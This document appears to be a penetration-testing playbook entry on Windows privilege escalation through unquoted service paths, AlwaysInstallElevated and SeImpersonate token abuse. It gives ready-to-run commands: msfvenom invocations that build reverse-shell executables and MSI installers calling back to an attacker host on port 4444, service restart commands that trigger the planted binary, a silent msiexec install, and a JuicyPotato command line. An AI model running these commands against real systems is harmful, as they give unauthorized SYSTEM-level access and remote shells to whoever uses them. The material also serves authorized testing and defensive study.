# Unquoted Service Path

## When this applies

- Windows foothold; `wmic service get pathname` reveals services with unquoted paths containing spaces.
- You have write access to one of the parent directories.

## Technique

Windows tries each space-separated path prefix as a binary. If `C:\Program.exe` exists, SCM runs it instead of `C:\Program Files\My Service\service.exe`.

## Steps

```powershell
# If service path is C:\Program Files\My Service\service.exe
# Create C:\Program.exe or C:\Program Files\My.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o Program.exe
sc stop "VulnService"
sc start "VulnService"
```

## AlwaysInstallElevated

```bash
# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi
# Execute as standard user
msiexec /quiet /qn /i C:\path\to\shell.msi
```

## Token Impersonation (if SeImpersonate enabled)

```powershell
# Using JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

## Verifying success

- After service restart, the attacker payload runs as the service principal (often LocalSystem).

## Common pitfalls

- `sc stop` / `sc start` requires `SERVICE_STOP` / `SERVICE_START` — often not granted to non-admins. Wait for scheduled restart or use ImagePath registry path (`server-operators-imagepath.md`).
- `AlwaysInstallElevated` requires both `HKLM` and `HKCU` registry keys set to 1.

## Tools

- msfvenom
- sc.exe
- msiexec
- wmic / Get-Service
